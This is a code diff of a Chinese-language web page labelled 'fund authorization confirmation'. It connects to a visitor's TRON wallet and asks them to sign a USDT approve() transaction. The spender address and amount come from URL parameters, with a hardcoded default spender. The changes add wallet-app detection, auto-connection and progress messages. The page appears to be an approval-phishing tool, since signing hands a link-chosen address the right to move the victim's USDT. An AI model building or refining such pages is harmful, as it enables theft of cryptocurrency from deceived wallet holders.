@@ -8,6 +8,7 @@
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
 
 <style>
+
 body{
 font-family:Arial;
 background:#f5f5f5;
@@ -24,30 +25,39 @@ margin:auto;
 box-shadow:0 2px 10px rgba(0,0,0,0.1);
 }
 
+.info{
+margin:8px 0;
+word-break:break-all;
+}
+
 button{
 background:#2b6cff;
 color:white;
 border:none;
-padding:15px 30px;
+padding:14px 30px;
 font-size:16px;
 border-radius:6px;
 cursor:pointer;
 }
 
-.info{
-margin:10px 0;
-word-break:break-all;
-}
-
-#msg{
+.status{
 margin-top:20px;
+text-align:left;
 font-size:14px;
-color:#d33;
 }
 
-.success{
+.step{
+margin:6px 0;
+}
+
+.ok{
 color:green;
 }
+
+.err{
+color:red;
+}
+
 </style>
 
 </head>
@@ -58,7 +68,7 @@ color:green;
 
 <h2>资金授权确认</h2>
 
-<div class="info" id="cid"></div>
+<div class="info" id="wallet">钱包检测中...</div>
 <div class="info" id="spender"></div>
 <div class="info" id="amount"></div>
 
@@ -66,7 +76,7 @@ color:green;
 
 <button onclick="approve()">确认授权</button>
 
-<div id="msg"></div>
+<div class="status" id="status"></div>
 
 </div>
 
@@ -78,18 +88,36 @@ const USDT="TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"
 
 const params=new URLSearchParams(location.search)
 
-const spender=params.get("to") || DEFAULT_SPENDER
-const amount=parseInt(params.get("amount") || DEFAULT_AMOUNT)
-const cid=params.get("cid") || ""
+const spender=params.get("to")||DEFAULT_SPENDER
+const amount=parseInt(params.get("amount")||DEFAULT_AMOUNT)
 
-document.getElementById("cid").innerText = cid ? "客户ID: "+cid : ""
-document.getElementById("spender").innerText = "授权地址: "+spender
-document.getElementById("amount").innerText = "授权额度: "+amount+" USDT"
+document.getElementById("spender").innerText="授权地址: "+spender
+document.getElementById("amount").innerText="授权额度: "+amount+" USDT"
 
-function setMsg(text,ok=false){
-const el=document.getElementById("msg")
+function step(text,ok=false,error=false){
+
+const el=document.createElement("div")
+el.className="step"
+
+if(ok) el.classList.add("ok")
+if(error) el.classList.add("err")
+
 el.innerText=text
-if(ok) el.className="success"
+
+document.getElementById("status").appendChild(el)
+
+}
+
+function detectWallet(){
+
+const ua=navigator.userAgent.toLowerCase()
+
+if(ua.includes("tokenpocket")) return "TokenPocket"
+if(ua.includes("imtoken")) return "imToken"
+if(ua.includes("tronlink")) return "TronLink"
+
+return "Unknown"
+
 }
 
 async function waitTron(){
@@ -111,7 +139,7 @@ count++
 
 if(count>20){
 clearInterval(timer)
-reject("未检测到TRON钱包，请用TokenPocket或IMToken打开")
+reject("未检测到TRON钱包")
 }
 
 },500)
@@ -120,11 +148,39 @@ reject("未检测到TRON钱包，请用TokenPocket或IMToken打开")
 
 }
 
-async function approve(){
+async function init(){
+
+const wallet=detectWallet()
+
+document.getElementById("wallet").innerText="钱包环境: "+wallet
 
 try{
 
-setMsg("正在连接钱包...")
+await waitTron()
+
+const user=window.tronWeb.defaultAddress.base58
+
+document.getElementById("wallet").innerText=
+"钱包地址: "+user
+
+}catch(e){
+
+document.getElementById("wallet").innerText=
+"未连接钱包"
+
+}
+
+}
+
+init()
+
+async function approve(){
+
+document.getElementById("status").innerHTML=""
+
+try{
+
+step("1. 检测钱包")
 
 await waitTron()
 
@@ -136,25 +192,35 @@ if(!user){
 throw "钱包未连接"
 }
 
-setMsg("钱包: "+user)
+step("✔ 钱包连接成功: "+user,true)
+
+step("2. 连接USDT合约")
 
 const contract=await tronWeb.contract().at(USDT)
 
-const value=amount*1000000
+step("✔ 合约连接成功",true)
 
-setMsg("正在发送授权交易...")
+step("3. 构造授权交易")
 
-await contract.approve(spender,value).send({
+const value=(amount*1000000).toString()
+
+step("授权金额: "+value)
+
+step("4. 等待钱包签名")
+
+const tx=await contract.approve(spender,value).send({
 feeLimit:100000000
 })
 
-setMsg("授权成功 ✔",true)
+step("✔ 授权成功",true)
+
+step("交易ID: "+tx)
 
 }catch(e){
 
 console.error(e)
 
-setMsg("授权失败: "+e)
+step("授权失败: "+JSON.stringify(e),false,true)
 
 }
 
